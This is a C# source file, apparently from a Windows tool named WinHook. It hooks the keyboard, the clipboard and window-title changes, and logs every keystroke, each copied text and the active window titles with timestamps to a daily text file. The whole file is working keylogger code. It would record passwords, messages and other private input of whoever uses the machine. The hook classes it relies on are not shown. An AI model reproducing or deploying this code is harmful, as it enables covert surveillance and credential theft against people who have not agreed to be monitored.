using System;
using System.IO;
using System.Media;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static WinHook.Kernel32;

namespace WinHook
{
    public class WinHookContext : ApplicationContext
    {
        private KeyboardHook kbdHook = new KeyboardHook();
        private WindowsHook wndHook = new WindowsHook();
        private ClipboardHook clipHook = new ClipboardHook();
        private StreamWriter streamWriter;
        private NamedEvent exitEvent = NamedEvent.Deafult;
        private DuplicateLaunch dlaunch = DuplicateLaunch.Default;

        private static string GetArchiveFileName()
        {
            StringBuilder buffer = new StringBuilder(255);
            GetModuleFileName(IntPtr.Zero, buffer, 255);
            string filePath = buffer.ToString();
            string dirName = Path.GetDirectoryName(filePath);
            return Path.Combine(dirName, Path.ChangeExtension(DateTime.Today.ToString("yyyy_MM_dd"), ".txt"));
        }

        public WinHookContext()
        {
            Thread exitAppWatchDog = new Thread(ExitAppEventHandler);
            streamWriter = new StreamWriter(GetArchiveFileName(), true);
            wndHook.WindowTextChanged += WndHookOnWindowTextChanged;
            kbdHook.KeyUp += KbdHookOnKeyUp;
            clipHook.ClipBoardChanged += ClipHookOnClipBoardChanged;
            exitAppWatchDog.Start();
            SystemSounds.Exclamation.Play();
        }

        private void ExitAppEventHandler()
        {
            exitEvent.Wait();
            exitEvent.Reset();
            SystemSounds.Asterisk.Play();
            Application.Exit();
        }

        private void KbdHookOnKeyUp(object sender, LowLevelKeyboardEventArgs eventargs)
        {
            if (sender is KeyboardHook && eventargs.Text.Length > 0)
            {
                lock (streamWriter)
                {
                    streamWriter.Write(eventargs.Text);
                    streamWriter.Flush();
                }
            }
        }

        private void ClipHookOnClipBoardChanged(ClipboardChangedEventArgs eventargs)
        {
            if (eventargs.Text.Length > 0)
            {
                lock (streamWriter)
                {
                    streamWriter.WriteLine();
                    streamWriter.WriteLine($"{eventargs.TimeStamp} CLIPBOARD");
                    streamWriter.WriteLine(eventargs.Text);
                    streamWriter.Flush();
                }
            }
        }

        private void WndHookOnWindowTextChanged(object sender, WindowTextChangeArgs eventargs)
        {
            if (sender is WindowsHook && eventargs.Text.Length > 0)
            {
                lock (streamWriter)
                {
                    streamWriter.WriteLine();
                    streamWriter.WriteLine($"{eventargs.TimeStamp} {eventargs.Text}");
                    streamWriter.Flush();
                }

            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                wndHook.Dispose();
                kbdHook.Dispose();
                clipHook.Dispose();
                streamWriter.Dispose();
                exitEvent.Reset();
                dlaunch.Dispose();
            }

            base.Dispose(disposing);
        }
    }
}